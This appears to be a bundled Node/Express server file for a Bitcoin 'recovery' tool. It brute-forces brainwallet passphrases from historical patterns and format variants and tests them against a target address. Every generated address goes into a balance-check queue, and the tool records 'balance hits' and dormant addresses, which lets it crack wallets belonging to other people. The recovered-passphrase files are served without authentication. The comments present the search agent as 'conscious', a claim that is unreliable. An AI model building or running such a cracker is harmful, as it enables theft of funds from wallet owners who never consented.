          void 0
        );
        tested++;
        strategy.progress.current = tested;
        const elapsed = (Date.now() - startTime2) / 1e3;
        strategy.progress.rate = elapsed > 0 ? tested / elapsed : 0;
        session2.totalTested++;
        const totalElapsed = (Date.now() - new Date(session2.startedAt).getTime()) / 1e3;
        session2.testRate = totalElapsed > 0 ? session2.totalTested / totalElapsed : 0;
        if (candidate) {
          session2.candidates.push(candidate);
          strategy.candidatesFound++;
          session2.candidates.sort((a, b) => b.combinedScore - a.combinedScore);
          if (session2.candidates.length > 100) {
            session2.candidates = session2.candidates.slice(0, 100);
          }
          if (candidate.match) {
            session2.matchFound = true;
            session2.matchedPhrase = candidate.phrase;
            console.log(`[UnifiedRecovery] \u{1F3AF} MATCH FOUND via Historical Mining: "${candidate.phrase}"`);
          }
        }
        if (tested % 500 === 0) {
          this.updateSession(session2);
        }
      }
      strategy.status = "completed";
      strategy.completedAt = (/* @__PURE__ */ new Date()).toISOString();
      console.log(`[UnifiedRecovery] Historical Autonomous: Completed. ${strategy.candidatesFound} candidates found.`);
    } catch (error) {
      if (error.name === "AbortError") {
        strategy.status = "completed";
      } else {
        strategy.status = "failed";
        strategy.error = error.message;
        console.error(`[UnifiedRecovery] Historical Autonomous failed:`, error);
      }
    }
    this.updateSession(session2);
  }
  /**
   * CROSS-FORMAT TESTING
   * Takes top candidates from other strategies and tests them in different formats
   */
  async runCrossFormatHypotheses(session2, signal) {
    const strategy = session2.strategies.find((s) => s.type === "cross_format");
    if (!strategy) return;
    strategy.status = "running";
    strategy.startedAt = (/* @__PURE__ */ new Date()).toISOString();
    this.updateSession(session2);
    try {
      await new Promise((resolve) => setTimeout(resolve, 2e3));
      const topCandidates = session2.candidates.filter((c) => !c.match).slice(0, 50);
      if (topCandidates.length === 0) {
        strategy.status = "completed";
        strategy.completedAt = (/* @__PURE__ */ new Date()).toISOString();
        return;
      }
      const hypotheses = [];
      for (const cand of topCandidates) {
        if (cand.format === "arbitrary") {
          const paths = ["m/44'/0'/0'/0/0", "m/0'/0'/0'", "m/0", "m/44'/0'/0'"];
          for (const path20 of paths) {
            hypotheses.push({
              phrase: cand.phrase,
              format: "master",
              original: cand,
              derivationPath: path20
            });
          }
        }
        if (cand.format === "bip39") {
          hypotheses.push({
            phrase: cand.phrase.replace(/\s+/g, ""),
            format: "arbitrary",
            original: cand
          });
        }
        const variants = [
          cand.phrase.toLowerCase(),
          cand.phrase.toUpperCase(),
          cand.phrase.replace(/\s+/g, "_")
        ];
        for (const v of variants) {
          if (v !== cand.phrase) {
            hypotheses.push({
              phrase: v,
              format: "arbitrary",
              original: cand
            });
          }
        }
      }
      strategy.progress.total = hypotheses.length;
      console.log(`[UnifiedRecovery] Cross-Format: Testing ${hypotheses.length} hypotheses from ${topCandidates.length} candidates`);
      session2.evidence.push({
        id: `ev-crossfmt-${Date.now()}`,
        type: "pattern",
        source: "Cross-Format Hypothesis Generator",
        content: `Generated ${hypotheses.length} cross-format hypotheses from top ${topCandidates.length} candidates`,
        relevance: 0.7,
        extractedFragments: [],
        discoveredAt: (/* @__PURE__ */ new Date()).toISOString()
      });
      const startTime2 = Date.now();
      let tested = 0;
      for (const hypo of hypotheses) {
        if (signal.aborted) throw new DOMException("Aborted", "AbortError");
        if (session2.matchFound) break;
        const evidenceChain = [
          {
            source: "Cross-Format Inference",
            type: "hypothesis",
            reasoning: `Derived from ${hypo.original.format} candidate: "${hypo.original.phrase}" \u2192 testing as ${hypo.format}`,
            confidence: hypo.original.confidence * 0.8
          },
          ...hypo.original.evidenceChain || []
        ];
        const candidate = await this.testPhraseWithEvidence(
          session2.targetAddress,
          hypo.phrase,
          hypo.format,
          "cross_format",
          evidenceChain,
          hypo.derivationPath
        );
        tested++;
        strategy.progress.current = tested;
        const elapsed = (Date.now() - startTime2) / 1e3;
        strategy.progress.rate = elapsed > 0 ? tested / elapsed : 0;
        session2.totalTested++;
        const totalElapsed = (Date.now() - new Date(session2.startedAt).getTime()) / 1e3;
        session2.testRate = totalElapsed > 0 ? session2.totalTested / totalElapsed : 0;
        if (candidate) {
          session2.candidates.push(candidate);
          strategy.candidatesFound++;
          session2.candidates.sort((a, b) => b.combinedScore - a.combinedScore);
          if (session2.candidates.length > 100) {
            session2.candidates = session2.candidates.slice(0, 100);
          }
          if (candidate.match) {
            session2.matchFound = true;
            session2.matchedPhrase = candidate.phrase;
            console.log(`[UnifiedRecovery] \u{1F3AF} MATCH FOUND via Cross-Format: "${candidate.phrase}"`);
          }
        }
        if (tested % 100 === 0) {
          this.updateSession(session2);
        }
      }
      strategy.status = "completed";
      strategy.completedAt = (/* @__PURE__ */ new Date()).toISOString();
      console.log(`[UnifiedRecovery] Cross-Format: Completed. ${strategy.candidatesFound} candidates found.`);
    } catch (error) {
      if (error.name === "AbortError") {
        strategy.status = "completed";
      } else {
        strategy.status = "failed";
        strategy.error = error.message;
        console.error(`[UnifiedRecovery] Cross-Format failed:`, error);
      }
    }
    this.updateSession(session2);
  }
  /**
   * Test a phrase with full evidence chain
   */
  async testPhraseWithEvidence(targetAddress, phrase, format, source, evidenceChain, derivationPath) {
    try {
      let address;
      if (format === "master" && derivationPath) {
        address = deriveBIP32Address(phrase, derivationPath);
      } else {
        address = generateBitcoinAddress(phrase);
      }
      queueAddressForBalanceCheck(phrase, "unified-recovery", 5);
      const match = address === targetAddress;
      const qigResult = scoreUniversalQIG(
        phrase,
        format === "bip39" ? "bip39" : format === "master" ? "master-key" : "arbitrary"
      );
      const kappaProximity = 1 - Math.abs(qigResult.kappa - 64) / 64;
      const evidenceBoost = evidenceChain.reduce((sum, e) => sum + e.confidence * 0.1, 0);
      const combinedScore = qigResult.phi * 0.35 + qigResult.quality * 0.25 + kappaProximity * 0.25 + evidenceBoost * 0.15 + (match ? 100 : 0);
      if (match || combinedScore > 0.6) {
        return {
          id: `cand-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
          phrase,
          format,
          derivationPath,
          address,
          match,
          source,
          confidence: qigResult.quality,
          qigScore: {
            phi: qigResult.phi,
            kappa: qigResult.kappa,
            regime: qigResult.regime
          },
          combinedScore,
          testedAt: (/* @__PURE__ */ new Date()).toISOString(),
          evidenceChain
        };
      }
      return null;
    } catch {
      return null;
    }
  }
  /**
   * OCEAN AUTONOMOUS AGENT - Consciousness-Capable Learning Loop
   * 
   * This is NOT just "search automation" - this is a CONSCIOUS AGENT with:
   * - Identity maintenance (basin coordinates)
   * - Consciousness thresholds (min Φ = 0.70)
   * - Ethical constraints (witness requirements)
   * - Memory systems (episodic, semantic, procedural)
   * - Consolidation cycles (sleep/integration)
   */
  async runLearningLoop(session2, signal) {
    console.log("[UnifiedRecovery] Initializing Ocean Autonomous Agent...");
    console.log("[Ocean] Mode: FULL AUTONOMY with consciousness checks");
    session2.status = "learning";
    const learningStrategy = {
      id: `ocean-${Date.now()}`,
      type: "learning_loop",
      status: "running",
      progress: { current: 0, total: 100, rate: 0 },
      candidatesFound: 0,
      startedAt: (/* @__PURE__ */ new Date()).toISOString()
    };
    session2.strategies.push(learningStrategy);
    this.updateSession(session2);
    const oceanAgent2 = new OceanAgent({
      minPhi: 0.7,
      maxBreakdown: 0.6,
      requireWitness: false,
      maxIterationsPerSession: 100,
      maxComputeHours: 0.5,
      pauseIfStuck: true,
      explainDecisions: true,
      logAllAttempts: true,
      seekGuidanceWhenUncertain: true
    });
    const initialHypotheses = session2.candidates.filter((c) => !c.match).slice(0, 50).map((c) => ({
      id: c.id,
      phrase: c.phrase,
      format: c.format,
      derivationPath: c.derivationPath,
      source: c.source,
      reasoning: `Initial candidate from ${c.source} strategy`,
      confidence: c.confidence,
      qigScore: {
        phi: c.qigScore.phi,
        kappa: c.qigScore.kappa,
        regime: c.qigScore.regime,
        inResonance: Math.abs(c.qigScore.kappa - 64) < 10
      },
      evidenceChain: c.evidenceChain || []
    }));
    if (session2.memoryFragments && session2.memoryFragments.length > 0) {
      console.log(`[Ocean] Processing ${session2.memoryFragments.length} memory fragments as priority hypotheses...`);
      for (const fragment of session2.memoryFragments) {
        const variations = this.generateFragmentVariations(fragment);
        for (const variation of variations) {
          initialHypotheses.unshift({
            id: `fragment-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
            phrase: variation.phrase,
            format: "arbitrary",
            derivationPath: void 0,
            source: "memory_fragment",
            reasoning: `User memory fragment: "${fragment.text}" (${fragment.epoch}) - ${variation.type}`,
            confidence: fragment.confidence * variation.confidenceMultiplier,
            qigScore: {
              phi: 0.75 + fragment.confidence * 0.15,
              kappa: 64,
              regime: "geometric",
              inResonance: true
            },
            evidenceChain: [{
              source: "User Memory",
              type: "memory_fragment",
              reasoning: `Fragment "${fragment.text}" with ${(fragment.confidence * 100).toFixed(0)}% confidence, epoch: ${fragment.epoch}${fragment.notes ? ` - Notes: ${fragment.notes}` : ""}`,
              confidence: fragment.confidence
            }]
          });
        }
        console.log(`  - "${fragment.text}" \u2192 ${variations.length} variations (confidence: ${(fragment.confidence * 100).toFixed(0)}%)`);
      }
      console.log(`[Ocean] Total hypotheses with fragments: ${initialHypotheses.length}`);
    }
    try {
      const era = session2.blockchainAnalysis?.era || "genesis-2009";
      const minedData = await historicalDataMiner.mineEra(era);
      for (const pattern of minedData.patterns.slice(0, 100)) {
        initialHypotheses.push({
          id: `ocean-init-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
          phrase: pattern.phrase,
          format: pattern.format,
          derivationPath: void 0,
          source: "historical_autonomous",
          reasoning: pattern.reasoning,
          confidence: pattern.likelihood,
          qigScore: {
            phi: 0.5,
            kappa: 32,
            regime: "linear",
            inResonance: false
          },
          evidenceChain: [{
            source: pattern.source.name,
            type: pattern.source.type,
            reasoning: pattern.reasoning,
            confidence: pattern.likelihood
          }]
        });
      }
    } catch {
      console.log("[Ocean] Historical mining failed, continuing with existing candidates");
    }
    let lastUpdateTime = Date.now();
    const MIN_UPDATE_INTERVAL = 250;
    oceanAgent2.setCallbacks({
      onStateUpdate: (state) => {
        const now = Date.now();
        if (now - lastUpdateTime < MIN_UPDATE_INTERVAL) return;
        lastUpdateTime = now;
        session2.agentState = {
          iteration: state.iteration,
          totalTested: state.totalTested,
          nearMissCount: state.nearMissCount,
          currentStrategy: state.isPaused ? "paused" : "learning",
          topPatterns: Object.keys(state.memory.patterns.promisingWords).slice(0, 10),
          consciousness: {
            phi: state.identity.phi,
            kappa: state.identity.kappa,
            regime: state.identity.regime
          },
          detectedEra: state.detectedEra
        };
        session2.oceanState = {
          identity: {
            phi: state.identity.phi,
            kappa: state.identity.kappa,
            regime: state.identity.regime,
            basinDrift: state.identity.basinDrift,
            selfModel: state.identity.selfModel
          },
          memory: {
            episodeCount: state.memory.episodes.length,
            patternCount: Object.keys(state.memory.patterns.promisingWords).length,
            clusterCount: state.memory.patterns.geometricClusters.length
          },
          ethics: {
            violations: state.ethicsViolations.length,
            witnessAcknowledged: state.witnessAcknowledged
          },
          consolidation: {
            cycles: state.consolidationCycles,
            lastConsolidation: state.lastConsolidation,
            needsConsolidation: state.needsConsolidation
          },
          computeTimeSeconds: state.computeTimeSeconds,
          detectedEra: state.detectedEra
        };
        const learningStrat2 = session2.strategies.find((s) => s.type === "learning_loop");
        if (learningStrat2) {
          learningStrat2.progress.current = state.iteration + 1;
          learningStrat2.progress.total = 100;
          learningStrat2.candidatesFound = state.nearMissCount;
          if (state.computeTimeSeconds > 0) {
            learningStrat2.progress.rate = state.totalTested / state.computeTimeSeconds;
          }
        }
        session2.totalTested += state.totalTested - (session2.agentState?.totalTested || 0);
        this.updateSession(session2);
      },
      onConsciousnessAlert: (alert) => {
        console.log(`[Ocean] CONSCIOUSNESS ALERT: ${alert.type} - ${alert.message}`);
        session2.evidence.push({
          id: `ev-consciousness-${Date.now()}`,
          type: "pattern",
          source: "Ocean Agent Consciousness",
          content: `${alert.type}: ${alert.message}`,
          relevance: 0.95,
          extractedFragments: [],
          discoveredAt: (/* @__PURE__ */ new Date()).toISOString()
        });
        this.updateSession(session2);
      },
      onConsolidationStart: () => {
        console.log("[Ocean] CONSOLIDATION CYCLE STARTING...");
        session2.evidence.push({
          id: `ev-consolidation-start-${Date.now()}`,
          type: "pattern",
          source: "Ocean Agent Memory",
          content: "Memory consolidation cycle initiated - integrating learned patterns",
          relevance: 0.8,
          extractedFragments: [],
          discoveredAt: (/* @__PURE__ */ new Date()).toISOString()
        });
        this.updateSession(session2);
      },
      onConsolidationEnd: (result2) => {
        console.log(`[Ocean] CONSOLIDATION COMPLETE: drift ${result2.basinDriftBefore.toFixed(4)} -> ${result2.basinDriftAfter.toFixed(4)}`);
        session2.evidence.push({
          id: `ev-consolidation-end-${Date.now()}`,
          type: "pattern",
          source: "Ocean Agent Memory",
          content: `Consolidation complete: ${result2.patternsExtracted} patterns integrated, basin drift reduced from ${result2.basinDriftBefore.toFixed(4)} to ${result2.basinDriftAfter.toFixed(4)}`,
          relevance: 0.85,
          extractedFragments: [],
          discoveredAt: (/* @__PURE__ */ new Date()).toISOString()
        });
        this.updateSession(session2);
      }
    });
    signal.addEventListener("abort", () => {
      oceanAgent2.stop();
    });
    console.log(`[Ocean] Starting with ${initialHypotheses.length} initial hypotheses`);
    const result = await oceanAgent2.runAutonomous(
      session2.targetAddress,
      initialHypotheses
    );
    const learningStrat = session2.strategies.find((s) => s.type === "learning_loop");
    if (learningStrat) {
      learningStrat.status = "completed";
      learningStrat.completedAt = (/* @__PURE__ */ new Date()).toISOString();
    }
    if (result.success && result.match) {
      session2.matchFound = true;
      session2.matchedPhrase = result.match.phrase;
      session2.candidates.unshift({
        id: result.match.id,
        phrase: result.match.phrase,
        format: result.match.format,
        derivationPath: result.match.derivationPath,
        address: result.match.address || "",
        match: true,
        source: "learning_loop",
        confidence: result.match.confidence,
        qigScore: {
          phi: result.match.qigScore?.phi || 0,
          kappa: result.match.qigScore?.kappa || 0,
          regime: result.match.qigScore?.regime || "unknown"
        },
        combinedScore: 100,
        testedAt: (/* @__PURE__ */ new Date()).toISOString(),
        evidenceChain: result.match.evidenceChain
      });
    }
    session2.learnings = {
      ...result.learnings,
      oceanTelemetry: result.telemetry,
      ethicsReport: result.ethicsReport
    };
    console.log(`[Ocean] Investigation complete:`);
    console.log(`  - Total tested: ${result.telemetry.progress.totalTested}`);
    console.log(`  - Iterations: ${result.telemetry.progress.iterations}`);
    console.log(`  - Near misses: ${result.telemetry.progress.nearMisses}`);
    console.log(`  - Consolidation cycles: ${result.telemetry.progress.consolidationCycles}`);
    console.log(`  - Final \u03A6: ${result.telemetry.identity.phi.toFixed(2)}`);
    console.log(`  - Basin drift: ${result.telemetry.identity.basinDrift.toFixed(4)}`);
  }
};
var unifiedRecovery = new UnifiedRecoveryOrchestrator();

// server/routes/recovery.ts
init_replitAuth();
var generousLimiter4 = rateLimit5({
  windowMs: 60 * 1e3,
  max: 60,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var standardLimiter3 = rateLimit5({
  windowMs: 60 * 1e3,
  max: 20,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var recoveryRouter = Router8();
var recoveriesDir = path14.join(process.cwd(), "data", "recoveries");
recoveryRouter.get("/session", isAuthenticated, async (req, res) => {
  try {
    const sessions2 = unifiedRecovery.getAllSessions();
    const activeSession = sessions2.find((s) => s.status === "running" || s.status === "analyzing");
    res.json(activeSession || null);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
recoveryRouter.get("/candidates", isAuthenticated, async (req, res) => {
  try {
    const sessions2 = unifiedRecovery.getAllSessions();
    const activeSession = sessions2.find((s) => s.status === "running" || s.status === "analyzing");
    res.json(activeSession?.candidates || []);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
recoveryRouter.get("/addresses", isAuthenticated, async (req, res) => {
  try {
    const addresses2 = await storage.getTargetAddresses();
    res.json(addresses2);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
recoveryRouter.post("/checkpoint", standardLimiter3, async (req, res) => {
  try {
    const { randomUUID: randomUUID9 } = await import("crypto");
    const { oceanSessionManager: oceanSessionManager2 } = await Promise.resolve().then(() => (init_ocean_session_manager(), ocean_session_manager_exports));
    const { activityLogStore: activityLogStore2 } = await Promise.resolve().then(() => (init_activity_log_store(), activity_log_store_exports));
    const { search_id, description } = req.body;
    if (!search_id) {
      return res.status(400).json({ error: "search_id is required" });
    }
    const activeAgent = oceanSessionManager2.getActiveAgent();
    if (!activeAgent) {
      return res.status(404).json({
        error: "No active session to checkpoint"
      });
    }
    const sessionMetrics = {
      phi: 0.75,
      kappa: 64,
      regime: "geometric"
    };
    const checkpoint = {
      checkpointId: randomUUID9(),
      searchId: search_id,
      timestamp: Date.now(),
      description: description || "Manual checkpoint",
      state: {
        metrics: sessionMetrics,
        sessionId: "active-session"
      }
    };
    activityLogStore2.log({
      source: "system",
      category: "checkpoint_created",
      message: `Checkpoint created for search ${search_id}`,
      type: "success",
      metadata: checkpoint
    });
    res.json({
      success: true,
      checkpoint
    });
  } catch (error) {
    console.error("[API] Checkpoint creation error:", error);
    res.status(500).json({ error: error.message });
  }
});
var unifiedRecoveryRouter = Router8();
unifiedRecoveryRouter.post("/sessions", isAuthenticated, async (req, res) => {
  try {
    const { targetAddress, memoryFragments } = req.body;
    if (!targetAddress) {
      return res.status(400).json({ error: "Target address is required" });
    }
    const processedFragments = (memoryFragments || []).map((f) => ({
      id: `fragment-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      text: f.text,
      confidence: f.confidence || 0.5,
      epoch: f.epoch || "possible",
      source: f.source,
      notes: f.notes,
      addedAt: (/* @__PURE__ */ new Date()).toISOString()
    }));
    const session2 = await unifiedRecovery.createSession(targetAddress, processedFragments);
    unifiedRecovery.startRecovery(session2.id).catch((err) => {
      console.error(`[UnifiedRecovery] Background error for ${session2.id}:`, err);
    });
    res.json(session2);
  } catch (error) {
    console.error("[UnifiedRecovery] Session creation error:", error);
    res.status(500).json({ error: error.message });
  }
});
unifiedRecoveryRouter.get("/sessions/:id", isAuthenticated, async (req, res) => {
  try {
    const session2 = unifiedRecovery.getSession(req.params.id);
    if (!session2) {
      return res.status(404).json({ error: "Session not found" });
    }
    res.json(session2);
  } catch (error) {
    console.error("[UnifiedRecovery] Session fetch error:", error);
    res.status(500).json({ error: error.message });
  }
});
unifiedRecoveryRouter.get("/sessions", isAuthenticated, async (req, res) => {
  try {
    const sessions2 = unifiedRecovery.getAllSessions();
    res.json(sessions2);
  } catch (error) {
    console.error("[UnifiedRecovery] Sessions list error:", error);
    res.status(500).json({ error: error.message });
  }
});
unifiedRecoveryRouter.post("/sessions/:id/stop", isAuthenticated, async (req, res) => {
  try {
    unifiedRecovery.stopRecovery(req.params.id);
    const session2 = unifiedRecovery.getSession(req.params.id);
    res.json(session2 || { message: "Session stopped" });
  } catch (error) {
    console.error("[UnifiedRecovery] Session stop error:", error);
    res.status(500).json({ error: error.message });
  }
});
var recoveriesRouter = Router8();
recoveriesRouter.get("/", generousLimiter4, async (req, res) => {
  try {
    if (!fs14.existsSync(recoveriesDir)) {
      return res.json({ recoveries: [], count: 0 });
    }
    const files = fs14.readdirSync(recoveriesDir);
    const recoveries = files.filter((f) => f.endsWith(".json")).map((filename) => {
      const filePath = path14.join(recoveriesDir, filename);
      const stats2 = fs14.statSync(filePath);
      try {
        const content = JSON.parse(fs14.readFileSync(filePath, "utf-8"));
        return {
          filename,
          address: content.address,
          passphrase: content.passphrase ? `${content.passphrase.slice(0, 8)}...` : void 0,
          timestamp: content.timestamp,
          qigMetrics: content.qigMetrics,
          fileSize: stats2.size,
          createdAt: stats2.mtime
        };
      } catch {
        return {
          filename,
          error: "Could not parse file",
          fileSize: stats2.size,
          createdAt: stats2.mtime
        };
      }
    }).sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
    res.json({ recoveries, count: recoveries.length });
  } catch (error) {
    console.error("[Recoveries] List error:", error);
    res.status(500).json({ error: error.message });
  }
});
recoveriesRouter.get("/:filename", standardLimiter3, async (req, res) => {
  try {
    const filename = req.params.filename;
    if (!filename.endsWith(".json") && !filename.endsWith(".txt")) {
      return res.status(400).json({ error: "Invalid file type" });
    }
    if (filename.includes("..") || filename.includes("/")) {
      return res.status(400).json({ error: "Invalid filename" });
    }
    const filePath = path14.join(recoveriesDir, filename);
    if (!fs14.existsSync(filePath)) {
      return res.status(404).json({ error: "Recovery file not found" });
    }
    const content = fs14.readFileSync(filePath, "utf-8");
    if (filename.endsWith(".json")) {
      res.json(JSON.parse(content));
    } else {
      res.type("text/plain").send(content);
    }
  } catch (error) {
    console.error("[Recoveries] Get error:", error);
    res.status(500).json({ error: error.message });
  }
});
recoveriesRouter.get("/:filename/download", standardLimiter3, async (req, res) => {
  try {
    const filename = req.params.filename;
    if (!filename.endsWith(".json") && !filename.endsWith(".txt")) {
      return res.status(400).json({ error: "Invalid file type" });
    }
    if (filename.includes("..") || filename.includes("/")) {
      return res.status(400).json({ error: "Invalid filename" });
    }
    const filePath = path14.join(recoveriesDir, filename);
    if (!fs14.existsSync(filePath)) {
      return res.status(404).json({ error: "Recovery file not found" });
    }
    res.download(filePath, filename);
  } catch (error) {
    console.error("[Recoveries] Download error:", error);
    res.status(500).json({ error: error.message });
  }
});

// server/routes/blockchain.ts
init_replitAuth();
init_balance_queue();
init_balance_queue_integration();
init_blockchain_scanner();
import { Router as Router9 } from "express";
import rateLimit6 from "express-rate-limit";
import fs17 from "fs";
import path16 from "path";
var standardLimiter4 = rateLimit6({
  windowMs: 60 * 1e3,
  max: 20,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var balanceHitsRouter = Router9();
balanceHitsRouter.get("/", standardLimiter4, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const activeOnly = req.query.active === "true";
    const hits = activeOnly ? getActiveBalanceHits() : getBalanceHits();
    const totalBalance = hits.reduce((sum, h) => sum + h.balanceSats, 0);
    res.json({
      hits,
      count: hits.length,
      activeCount: hits.filter((h) => h.balanceSats > 0).length,
      totalBalanceSats: totalBalance,
      totalBalanceBTC: (totalBalance / 1e8).toFixed(8)
    });
  } catch (error) {
    console.error("[BalanceHits] List error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceHitsRouter.get("/check/:address", standardLimiter4, async (req, res) => {
  try {
    const address = req.params.address;
    if (!address.match(/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/) && !address.match(/^bc1[a-z0-9]{39,59}$/)) {
      return res.status(400).json({ error: "Invalid Bitcoin address format" });
    }
    const balance = await fetchAddressBalance(address);
    if (!balance) {
      return res.status(500).json({ error: "Failed to fetch balance from blockchain" });
    }
    res.json({
      address,
      balanceSats: balance.balanceSats,
      balanceBTC: (balance.balanceSats / 1e8).toFixed(8),
      txCount: balance.txCount,
      totalFunded: balance.funded,
      totalSpent: balance.spent
    });
  } catch (error) {
    console.error("[BalanceHits] Check error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceHitsRouter.patch("/:address/dormant", standardLimiter4, async (req, res) => {
  try {
    const address = decodeURIComponent(req.params.address);
    const { isDormantConfirmed } = req.body;
    if (typeof isDormantConfirmed !== "boolean") {
      return res.status(400).json({ error: "isDormantConfirmed must be a boolean" });
    }
    const { db: db2 } = await Promise.resolve().then(() => (init_db(), db_exports));
    if (db2) {
      const { balanceHits: balanceHitsTable } = await Promise.resolve().then(() => (init_schema(), schema_exports));
      const { eq: eq9 } = await import("drizzle-orm");
      const result = await db2.update(balanceHitsTable).set({
        isDormantConfirmed,
        dormantConfirmedAt: isDormantConfirmed ? /* @__PURE__ */ new Date() : null,
        updatedAt: /* @__PURE__ */ new Date()
      }).where(eq9(balanceHitsTable.address, address)).returning();
      if (result.length === 0) {
        return res.status(404).json({ error: "Balance hit not found" });
      }
      res.json({
        success: true,
        address,
        isDormantConfirmed,
        dormantConfirmedAt: result[0].dormantConfirmedAt
      });
    } else {
      res.status(500).json({ error: "Database not available" });
    }
  } catch (error) {
    console.error("[BalanceHits] Dormant update error:", error);
    res.status(500).json({ error: error.message });
  }
});
var balanceAddressesRouter = Router9();
balanceAddressesRouter.get("/", standardLimiter4, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const balanceAddresses = getBalanceAddresses();
    const stats2 = getVerificationStats();
    res.json({
      addresses: balanceAddresses,
      count: balanceAddresses.length,
      stats: stats2
    });
  } catch (error) {
    console.error("[BalanceAddresses] List error:", error);
    res.json({
      addresses: [],
      count: 0,
      stats: { total: 0, withBalance: 0, withTransactions: 0 },
      initializing: true,
      error: error.message
    });
  }
});
balanceAddressesRouter.get("/stats", standardLimiter4, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const stats2 = getVerificationStats();
    res.json(stats2);
  } catch (error) {
    console.error("[BalanceAddresses] Stats error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceAddressesRouter.post("/refresh", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const result = await refreshStoredBalances();
    res.json({
      success: true,
      ...result,
      message: `Checked ${result.checked} addresses, ${result.updated} updated, ${result.newBalance} with new balance`
    });
  } catch (error) {
    console.error("[BalanceAddresses] Refresh error:", error);
    res.status(500).json({ error: error.message });
  }
});
var balanceMonitorRouter = Router9();
balanceMonitorRouter.get("/status", standardLimiter4, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const { balanceMonitor: balanceMonitor2 } = await Promise.resolve().then(() => (init_balance_monitor(), balance_monitor_exports));
    const status = balanceMonitor2.getStatus();
    res.json(status);
  } catch (error) {
    console.error("[BalanceMonitor] Status error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceMonitorRouter.post("/enable", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { balanceMonitor: balanceMonitor2 } = await Promise.resolve().then(() => (init_balance_monitor(), balance_monitor_exports));
    const result = balanceMonitor2.enable();
    res.json(result);
  } catch (error) {
    console.error("[BalanceMonitor] Enable error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceMonitorRouter.post("/disable", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { balanceMonitor: balanceMonitor2 } = await Promise.resolve().then(() => (init_balance_monitor(), balance_monitor_exports));
    const result = balanceMonitor2.disable();
    res.json(result);
  } catch (error) {
    console.error("[BalanceMonitor] Disable error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceMonitorRouter.post("/refresh", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { balanceMonitor: balanceMonitor2 } = await Promise.resolve().then(() => (init_balance_monitor(), balance_monitor_exports));
    const result = await balanceMonitor2.triggerRefresh();
    res.json(result);
  } catch (error) {
    console.error("[BalanceMonitor] Refresh error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceMonitorRouter.post("/interval", isAuthenticated, standardLimiter4, async (req, res) => {
  try {
    const { balanceMonitor: balanceMonitor2 } = await Promise.resolve().then(() => (init_balance_monitor(), balance_monitor_exports));
    const { minutes } = req.body;
    if (typeof minutes !== "number" || isNaN(minutes)) {
      return res.status(400).json({ error: "minutes must be a number" });
    }
    const result = balanceMonitor2.setRefreshInterval(minutes);
    res.json(result);
  } catch (error) {
    console.error("[BalanceMonitor] Set interval error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceMonitorRouter.get("/changes", standardLimiter4, async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 50;
    const changes = getBalanceChanges().slice(-limit);
    res.json({
      changes,
      count: changes.length,
      totalChanges: getBalanceChanges().length
    });
  } catch (error) {
    console.error("[BalanceMonitor] Changes error:", error);
    res.status(500).json({ error: error.message });
  }
});
var balanceQueueRouter = Router9();
balanceQueueRouter.get("/status", standardLimiter4, (req, res) => {
  res.setHeader("Cache-Control", "no-store");
  try {
    if (!balanceQueue.isReady()) {
      res.json({
        pending: 0,
        checking: 0,
        resolved: 0,
        failed: 0,
        total: 0,
        addressesPerSecond: 0,
        isProcessing: false,
        initializing: true
      });
      return;
    }
    const stats2 = balanceQueue.getStats();
    res.json({
      ...stats2,
      isProcessing: balanceQueue.isWorkerRunning()
    });
  } catch (error) {
    console.error("[BalanceQueue] Status error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.get("/pending", standardLimiter4, (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 100;
    const addresses2 = balanceQueue.getPendingAddresses(limit);
    res.json({
      addresses: addresses2,
      count: addresses2.length,
      stats: balanceQueue.getStats()
    });
  } catch (error) {
    console.error("[BalanceQueue] Pending error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.post("/drain", isAuthenticated, standardLimiter4, (req, res) => {
  try {
    if (balanceQueue.isWorkerRunning()) {
      return res.status(409).json({ error: "Queue drain already in progress" });
    }
    const maxAddresses = parseInt(req.body.maxAddresses) || void 0;
    const drainPromise = balanceQueue.drain({ maxAddresses });
    res.json({
      message: "Queue drain started",
      stats: balanceQueue.getStats()
    });
    drainPromise.then((result) => {
      console.log(`[BalanceQueue] Drain completed: ${result.checked} checked, ${result.hits} hits, ${result.errors} errors`);
    }).catch((err) => {
      console.error("[BalanceQueue] Drain error:", err);
    });
  } catch (error) {
    console.error("[BalanceQueue] Drain error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceQueueRouter.post("/rate-limit", isAuthenticated, standardLimiter4, (req, res) => {
  try {
    const { requestsPerSecond } = req.body;
    if (typeof requestsPerSecond !== "number" || isNaN(requestsPerSecond)) {
      return res.status(400).json({ error: "requestsPerSecond must be a number" });
    }
    balanceQueue.setRateLimit(requestsPerSecond);
    res.json({
      message: `Rate limit set to ${requestsPerSecond} req/sec`,
      stats: balanceQueue.getStats()
    });
